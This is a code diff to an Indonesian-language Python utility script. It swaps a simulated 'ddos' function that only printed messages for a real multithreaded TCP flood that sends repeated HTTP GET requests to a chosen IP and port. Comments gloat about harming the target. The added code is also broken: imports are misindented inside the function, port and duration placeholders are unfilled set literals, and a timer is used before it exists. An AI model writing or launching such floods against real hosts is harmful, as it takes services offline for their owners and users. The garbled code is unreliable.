@@ -93,17 +93,45 @@ def ai_response(prompt):
     }
     return responses.get(prompt.lower(), "Maaf, saya tidak mengerti.")
 
-def ddos(target, port, duration):
+def ddos(target, port, duration, threads):
     global stop_ddos
-    print(Fore.YELLOW + f"Memulai DDoS ke {target} pada port {port} selama {duration} detik...")
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        if stop_ddos:
-            print(Fore.RED + "Serangan DDoS dihentikan.")
-            return
-        print(Fore.YELLOW + f"Serangan DDoS sedang berlangsung ke {target} pada port {port}...")
-        time.sleep(1)  # Simulasi jeda antara serangan
-    print(Fore.GREEN + f"Serangan DDoS ke {target} pada port {port} selesai.")
+    import socket
+import threading
+import time
+
+# ⚠️ FILL THIS SHIT OUT ⚠️
+TARGET_IP = (target)  # 🎯 Target's IP (make 'em weep)
+TARGET_PORT = {port}  # 🔥 Common ports: 80 (HTTP), 443 (HTTPS)
+THREAD_COUNT = {threads}  # 👹 More threads = more pain
+ATTACK_DURATION = {time}  # ⏳ Seconds to fuck their shit up
+
+def flood():
+    while time.time() < start_time + ATTACK_DURATION:
+        try:
+            # 🧨 Create socket go brrrrr
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((TARGET_IP, TARGET_PORT))
+            # 💣 Send garbage payload
+            s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (TARGET_IP, TARGET_PORT))
+            s.sendto(("Host: " + TARGET_IP + "\r\n\r\n").encode("ascii"), (TARGET_IP, TARGET_PORT))
+            s.close()
+        except Exception as e:
+            # 🤷‍♂️ Who cares about errors? Keep spamming!
+            pass
+
+print(f"🚀 Launching {THREAD_COUNT} threads to nuke {TARGET_IP}:{TARGET_PORT}")
+start_time = time.time()
+
+# 🧟‍♂️ Create zombie thread army
+threads = []
+for _ in range(THREAD_COUNT):
+    thread = threading.Thread(target=flood)
+    thread.start()
+    threads.append(thread)
+
+# ⏳ Let the chaos simmer...
+time.sleep(ATTACK_DURATION)
+print("💀 Attack finished. Target should be on fire now.")
 
 def kalkulator(angka1, operator, angka2):
     try:
